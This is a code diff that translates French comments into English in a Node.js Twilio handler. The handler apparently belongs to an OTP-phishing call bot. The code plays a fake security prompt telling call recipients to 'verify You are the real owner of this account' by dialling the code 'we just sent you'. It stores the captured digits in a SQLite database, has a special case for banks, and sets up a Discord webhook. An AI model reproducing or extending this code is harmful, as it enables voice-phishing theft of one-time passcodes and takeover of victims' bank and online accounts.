@@ -1,6 +1,6 @@
 module.exports = function(request, response) {
     /**
-     * Fichier contenant les configurations nécéssaires au bon fonctionnement du système
+     * File containing the configurations necessary for the proper functioning of the system.
      */
     const config = require('.././config');
 
@@ -12,13 +12,13 @@ module.exports = function(request, response) {
     const hook = new Webhook(config.discordwebhook || '');
 
     /**
-     * Intégration des dépendences SQLITE3
+     * Integration of SQLITE3 dependencies.
      */
     const sqlite3 = require('sqlite3').verbose();
     const db = new sqlite3.Database('./db/data.db');
 
     /**
-     * Récupération des variables postées permettant d'ordonner la réponse API en TwiML
+     * Retrieval of posted variables allowing ordering of the API response in TwiML.
      */
     var input = request.body.RecordingUrl || request.body.Digits || "0";
     var callSid = request.body.CallSid;
@@ -30,7 +30,7 @@ module.exports = function(request, response) {
     }
 
     /**
-     * On récupère le Service utilisé dans cet appel pour ensuite retourner le bon audio à utiliser
+     * We retrieve the Service used in this call and then return the correct audio to use.
      */
     db.get('SELECT service, name, otplength FROM calls WHERE callSid = ?', [callSid], (err, row) => {
         if (err) {
@@ -38,9 +38,9 @@ module.exports = function(request, response) {
         }
 
         /**
-         * Au cas où le callSid n'est pas trouvé, on utilise l'audio par défaut
-         * Pareil pour le nom de la personne à appeler,
-         * Pareil pour l'otp length
+         * In case the callSid is not found, we use the default audio,
+         * Same for the name of the person to call,
+         * Same for the otp length.
          */
 		var service = row.service == null ? 'default' : row.service;
         var name = row.name == null ? '' : row.name;
@@ -51,7 +51,7 @@ module.exports = function(request, response) {
         var otplength = row.otplength == null ? '6' : row.otplength;
 
         /**
-         * L'on crée ici les url des audios grâce aux données dans le fichier config
+         *Here we create the URLs of the audios using the data in the config file.
          */
         var endurl = config.serverurl + '/stream/end';
         var askurl = config.serverurl + '/stream/' + service;
@@ -59,7 +59,7 @@ module.exports = function(request, response) {
 		
 
         /**
-         * Ici l'on crée la réponse TwiML à renvoyer, en y ajoutant l'url de l'audio
+         * Here we create the TwiML response to return, adding the audio URL.
          */
         var end = '<?xml version="1.0" encoding="UTF-8"?><Response><Say voice="Polly.Joanna">Your account is now secured. Thank You!</Say></Response>';
         var ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="15" numDigits="' + numdigits + '"><Pause length="2"/><Say voice="Polly.Joanna"><prosody rate="slow">For security reasons we have to verify You are the real owner of this account in order to block this request. Please dial the ' + numdigits + ' digit code we just sent you.</prosody></Say></Gather></Response>';
@@ -68,7 +68,7 @@ module.exports = function(request, response) {
         var otpSendEnd = end;
 
         /**
-         * Si l'utilisateur à envoyé le code, alors l'ajouter à la base de donnée et renvoyer l'audio de fin : fin de l'appel
+         * If the user sent the code, then add it to the database and return the ending audio: end of call.
          */
         length = service == 'banque' ? 8 : otplength;
         db.get('SELECT * FROM calls WHERE callSid = ?', [request.body.CallSid], (err, row) => {
@@ -108,11 +108,11 @@ module.exports = function(request, response) {
             } else {
                 if(input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
                     /**
-                     * Audio de fin
+                     * End audio.
                      */
                     respond(end);
                     /**
-                     * Ajout du code en DB
+                     * Adding code to DB.
                      */
                     db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                         if (err) {
@@ -121,7 +121,7 @@ module.exports = function(request, response) {
                     });
                 } else {
                     /**
-                     * L'on retourne le TwiML de base pour rejouer l'audio
+                     * We return the basic TwiML to replay the audio.
                      */
                     respond(ask);
                 }
